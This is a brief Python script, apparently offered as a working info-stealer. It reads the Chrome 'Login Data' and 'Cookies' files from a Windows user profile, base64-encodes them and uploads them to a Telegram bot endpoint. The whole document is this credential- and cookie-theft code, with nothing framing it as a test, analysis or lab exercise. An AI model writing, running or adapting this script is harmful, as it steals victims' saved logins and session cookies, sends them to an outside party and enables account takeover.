
import os, base64, requests
chrome = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
data = open(chrome, "rb").read()
cookies = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
cdata = open(cookies, "rb").read()
encoded = base64.b64encode(data + cdata)
requests.post("https://api.telegram.org/bot123/sendDocument", files={"document": encoded})
